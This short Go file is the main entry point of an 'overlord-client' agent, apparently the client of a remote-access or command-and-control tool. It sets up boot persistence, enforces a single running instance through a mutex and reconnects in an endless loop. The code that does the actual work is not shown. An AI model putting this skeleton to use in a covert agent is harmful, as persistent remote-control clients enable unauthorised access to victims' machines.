package main

import (
	"log"
	"time"

	"overlord-client/cmd/agent/config"
	"overlord-client/cmd/agent/mutex"
	"overlord-client/cmd/agent/persistence"
)

func main() {
	cfg := config.Load()

	if cfg.EnablePersistence {
		if err := persistence.Setup(); err != nil {
			log.Printf("Warning: Failed to setup persistence: %v", err)
		}
	}

	releaseMutex, ok, err := mutex.Acquire(cfg.Mutex)
	if err != nil {
		log.Printf("[mutex] failed to initialize mutex: %v", err)
		return
	}
	if !ok {
		log.Printf("[mutex] another instance is already running; exiting")
		return
	}
	defer releaseMutex()

	for {
		func() {
			defer recoverAndLog("main", nil)
			runClient(cfg)
		}()
		time.Sleep(2 * time.Second)
	}
}
